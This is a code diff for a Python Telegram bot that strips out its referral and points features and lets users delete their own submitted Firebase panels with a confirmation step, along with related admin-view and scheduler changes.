-        )
-    else:
-        top_text = "• No referrals yet"
-    avg = round(a["total_referrals"] / a["total_users"], 2) if a["total_users"] else 0
     text = (
         f"📈 <b>ANALYTICS</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👥 Total users: <b>{a['total_users']}</b>\n"
-        f"🔗 Total referrals: <b>{a['total_referrals']}</b>\n"
-        f"📊 Avg referrals / user: <b>{avg}</b>\n"
         f"🎡 Total spins: <b>{a['total_spins']}</b>\n"
         f"🪙 Active spinners: <b>{a['spinners']}</b>\n"
-        f"💎 Points awarded: <b>{a['points_awarded']}</b>\n"
-        f"🎰 Points spent: <b>{a['points_spent']}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🏆 <b>TOP REFERRERS</b>\n"
-        f"{top_text}\n"
+        f"🎡 Spins today: <b>{a['spins_today']}</b>\n"
+        f"🔥 Firebase panels: <b>{a['total_firebases']}</b>\n"
         f"{FOOTER}"
     )
     markup = back_markup("admin_panel")
@@ -2727,7 +2687,6 @@ def send_admin_user_detail(chat_id, message_id, target_id):
     if not u:
         safe_edit(chat_id, message_id, "❌ User not found.", None)
         return
-    ref_count = get_referral_count(target_id)
     spin_count = get_spin_count(target_id)
     fb_count = get_firebase_count(target_id)
     selected = get_selected_firebase(target_id)
@@ -2735,11 +2694,6 @@ def send_admin_user_detail(chat_id, message_id, target_id):
         f"🔒 <code>{escape(selected['firebase_url'])}</code>"
         if selected else "❌ None"
     )
-    ref_name = "—"
-    if u.get("referred_by"):
-        r = get_user(u["referred_by"])
-        if r:
-            ref_name = escape(r.get("first_name") or f"User_{r['user_id']}")
     text = (
         f"👤 <b>USER DETAIL</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -2747,11 +2701,8 @@ def send_admin_user_detail(chat_id, message_id, target_id):
         f"👤 Name: <b>{escape(u.get('first_name') or 'N/A')}</b>\n"
         f"📛 Username: @{escape(u.get('username') or 'N/A')}\n"
         f"📅 Joined: {u.get('registered_at') or 'N/A'}\n"
-        f"👥 Referred by: {ref_name}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💎 Points: <b>{u.get('points', 0)}</b>\n"
-        f"🔗 Referrals: <b>{ref_count}</b>\n"
-        f"📁 Firebase panels: <b>{fb_count}</b>\n"
+        f"📁 Firebase panels: <b>{fb_count}</b> (max 1)\n"
         f"🔒 Selected panel: {selected_txt}\n"
         f"🎡 Spins: <b>{spin_count}</b>\n"
         f"🎰 Last spin: {u.get('last_spin') or 'Never'}\n"
@@ -2759,8 +2710,6 @@ def send_admin_user_detail(chat_id, message_id, target_id):
         f"{FOOTER}"
     )
     kb = InlineKeyboardMarkup(row_width=2)
-    kb.row(btn("➕ ADD POINTS", callback_data=f"admin_add_pts_{target_id}"),
-           btn("➖ REMOVE POINTS", callback_data=f"admin_rem_pts_{target_id}"))
     kb.row(btn("🎡 SPIN HISTORY", callback_data=f"admin_spins_{target_id}"),
            btn("📁 FIREBASE", callback_data=f"admin_fb_user_{target_id}"))
     kb.row(btn("⛔ BAN/UNBAN", callback_data=f"admin_ban_{target_id}"))
@@ -2824,7 +2773,7 @@ def send_admin_firebases(chat_id, message_id=None, page=0, edit=True):
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Total URLs: <b>{len(rows)}</b>\n"
         f"Tap an entry to view its details.\n"
-        f"(Admins can view & delete; users cannot delete.)\n"
+        f"(Admins can view & delete all; users can delete their own.)\n"
         f"{FOOTER}"
     )
     if edit and message_id:
@@ -2942,7 +2891,7 @@ def send_admin_user_firebases(chat_id, message_id, target_id):
             + "\n".join(lines) +
             f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{sel_note}"
-            f"ℹ️ Users cannot delete panels — admin only.\n"
+            f"ℹ️ Users can delete their own panel in 📂 MY FIREBASE.\n"
             f"{FOOTER}"
         )
     kb = back_markup(f"admin_view_user_{target_id}")
@@ -2989,29 +2938,8 @@ def cmd_start(message):
     username = message.from_user.username or ""
     first_name = message.from_user.first_name or "User"
 
-    # Parse deep-link referral: /start ref_123456
-    referred_by = None
-    if message.text and "ref_" in message.text:
-        try:
-            referred_by = int(message.text.split("ref_")[1].split()[0])
-        except Exception:
-            referred_by = None
-
     if not get_user(user_id):
-        is_new = create_user(user_id, username, first_name, referred_by)
-        # Award the referrer immediately (points only on first join)
-        if is_new and referred_by and referred_by != user_id:
-            if award_referral(referred_by, user_id):
-                ref_user = get_user(referred_by)
-                ref_name = escape(ref_user.get("first_name") or "friend") if ref_user else "friend"
-                bot.send_message(
-                    referred_by,
-                    f"🎉 <b>New referral!</b>\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"👤 {ref_name} joined using your link!\n"
-                    f"💎 <b>+{REFERRAL_POINTS} points</b> added to your balance!\n"
-                    f"{FOOTER}",
-                )
+        create_user(user_id, username, first_name)
 
     user = get_user(user_id)
     if not user:
@@ -3114,39 +3042,6 @@ def handle_text(message):
                 )
                 return
 
-            if kind in ("add_points", "remove_points"):
-                target_id = admin_state.get("target")
-                with _state_lock:
-                    admin_states.pop(user_id, None)
-                try:
-                    amount = int(text)
-                    if amount <= 0:
-                        raise ValueError
-                except ValueError:
-                    bot.send_message(user_id,
-                                     "❌ Please send a valid positive number.\n"
-                                     "Use /cancel to abort.")
-                    return
-                if target_id is None:
-                    return
-                action = "add" if kind == "add_points" else "rem"
-                with _state_lock:
-                    admin_confirm_pts[user_id] = {"action": action, "target": target_id,
-                                                  "amount": amount}
-                kb = InlineKeyboardMarkup(row_width=2)
-                kb.row(btn("✅ CONFIRM",
-                           callback_data=f"admin_pts_confirm_{action}_{target_id}_{amount}"))
-                kb.row(btn("❌ CANCEL", callback_data="admin_pts_cancel"))
-                bot.send_message(
-                    user_id,
-                    f"{'➕' if action == 'add' else '➖'} Confirm "
-                    f"{'adding' if action == 'add' else 'removing'} "
-                    f"<b>{amount}</b> points {'to' if action == 'add' else 'from'} "
-                    f"user <code>{target_id}</code>?",
-                    reply_markup=kb,
-                )
-                return
-
     # ---- 4. Fallback ----
     bot.reply_to(message,
                  f"❓ Please use the menu buttons below.\n"
@@ -3195,16 +3090,6 @@ def handle_callback(call):
         bot.answer_callback_query(call.id)
         return
 
-    if data == "my_referrals":
-        send_my_referrals(chat_id, message_id, edit=True)
-        bot.answer_callback_query(call.id)
-        return
-
-    if data == "referral_link":
-        send_referral_link(chat_id, message_id, edit=True)
-        bot.answer_callback_query(call.id)
-        return
-
     if data == "my_history":
         send_history(chat_id, message_id, edit=True)
         bot.answer_callback_query(call.id)
@@ -3225,7 +3110,7 @@ def handle_callback(call):
         bot.answer_callback_query(call.id)
         return
 
-    # ─────────── ADD FIREBASE: confirmation (Add All / Cancel) ───────────
+    # ─────────── ADD FIREBASE: confirmation (Add This / Add All / Cancel) ───────────
     if data == "fb_add_confirm":
         with _state_lock:
             conf = firebase_confirmations.get(user_id)
@@ -3235,12 +3120,21 @@ def handle_callback(call):
                                       "📁 ADD FIREBASE.", show_alert=True)
             return
         confirm_firebase_add(chat_id, message_id)
-        bot.answer_callback_query(call.id, "✅ Added! Scanning starts...", show_alert=False)
+        bot.answer_callback_query(call.id, "✅ Added! Select a panel to process.",
+                                  show_alert=False)
         return
 
     if data == "fb_add_cancel":
         cancel_firebase_add(user_id)
         bot.answer_callback_query(call.id, "❌ Cancelled - nothing was added.")
+        return
+
+    if data.startswith("fb_add_one_"):
+        try:
+            idx = int(data.rsplit("_", 1)[-1])
+        except ValueError:
+            return
+        confirm_firebase_add_one(chat_id, message_id, idx, call)
         return
 
     # ─────────── MY FIREBASE: pagination / select / delete ───────────
@@ -3261,8 +3155,25 @@ def handle_callback(call):
         select_firebase(chat_id, message_id, fb_id, call)
         return
 
+    # ─────────── USER: delete own Firebase (with confirmation) ───────────
+    if data.startswith("fb_my_del_yes_"):
+        try:
+            fb_id = int(data.split("_")[-1])
+        except ValueError:
+            return
+        user_delete_firebase(chat_id, message_id, fb_id, call)
+        return
+
+    if data.startswith("fb_my_del_"):
+        try:
+            fb_id = int(data.split("_")[-1])
+        except ValueError:
+            return
+        confirm_user_delete_firebase(chat_id, message_id, fb_id)
+        return
+
     if data == "noop":
-        bot.answer_callback_query(call.id, "🔒 Locked — contact admin to change it.")
+        bot.answer_callback_query(call.id, "🔒 Selected panel — delete it to pick another.")
         return
 
     # ─────────── ADMIN ROUTING ───────────
@@ -3368,57 +3279,6 @@ def handle_admin_callback(call, chat_id, message_id, data):
         confirm_admin_delete_firebase(chat_id, message_id, fb_id)
         return
 
-    # ─────────── Add / remove points (amount entry) ───────────
-    if data.startswith("admin_add_pts_"):
-        try:
-            target = int(data.split("_")[-1])
-        except ValueError:
-            return
-        with _state_lock:
-            admin_states[user_id] = {"type": "add_points", "target": target}
-        bot.send_message(chat_id,
-                         f"➕ Enter the <b>amount of points</b> to add to "
-                         f"user <code>{target}</code>:\n"
-                         f"(positive integer, /cancel to abort)")
-        return
-
-    if data.startswith("admin_rem_pts_"):
-        try:
-            target = int(data.split("_")[-1])
-        except ValueError:
-            return
-        with _state_lock:
-            admin_states[user_id] = {"type": "remove_points", "target": target}
-        bot.send_message(chat_id,
-                         f"➖ Enter the <b>amount of points</b> to remove from "
-                         f"user <code>{target}</code>:\n"
-                         f"(positive integer, /cancel to abort)")
-        return
-
-    # ─────────── Point change confirmations ───────────
-    if data.startswith("admin_pts_confirm_add_") or data.startswith("admin_pts_confirm_rem_"):
-        parts = data.split("_")
-        action = parts[3]                       # "add" or "rem"
-        target = int(parts[4]) if len(parts) > 4 else 0
-        amount = int(parts[5]) if len(parts) > 5 else 0
-        if action == "add":
-            add_points(target, amount)
-            note = f"➕ Added <b>{amount}</b> points to user <code>{target}</code>!"
-        else:
-            remove_points(target, amount)
-            note = f"➖ Removed <b>{amount}</b> points from user <code>{target}</code>!"
-        with _state_lock:
-            admin_confirm_pts.pop(user_id, None)
-        safe_edit(chat_id, message_id, note + f"\n{FOOTER}", back_markup(f"admin_view_user_{target}"))
-        bot.answer_callback_query(call.id, "✅ Done!", show_alert=False)
-        return
-
-    if data == "admin_pts_cancel":
-        with _state_lock:
-            admin_confirm_pts.pop(user_id, None)
-        bot.answer_callback_query(call.id, "❌ Cancelled.")
-        return
-
     # ─────────── Ban / unban toggle ───────────
     if data.startswith("admin_ban_"):
         try:
@@ -3476,13 +3336,9 @@ def handle_admin_callback(call, chat_id, message_id, data):
 # ════════════════════════════════════════════════════════════════════════════
 
 def scheduler_loop():
-    """Runs every 60s: referral award safety net + stale state cleanup."""
+    """Runs every 60s: stale state cleanup."""
     while True:
         time.sleep(60)
-        try:
-            award_pending_referrals_safety()
-        except Exception as e:
-            logger.error("Scheduler referral task failed: %s", e)
         try:
             # Mark panels stuck in 'processing' (e.g. after a restart) as error
             reset_stale_processing(max_age_seconds=7200)
@@ -3497,6 +3353,15 @@ def scheduler_loop():
                         spin_sessions.pop(uid, None)
         except Exception as e:
             logger.error("Scheduler state cleanup failed: %s", e)
+        try:
+            # Clean stale Firebase confirmations older than 15 minutes
+            cutoff = time.time() - 900
+            with _state_lock:
+                for uid in [u for u in firebase_confirmations]:
+                    if firebase_confirmations[uid].get("_ts", time.time()) < cutoff:
+                        firebase_confirmations.pop(uid, None)
+        except Exception as e:
+            logger.error("Scheduler firebase-confirmation cleanup failed: %s", e)
 
 
 # ════════════════════════════════════════════════════════════════════════════
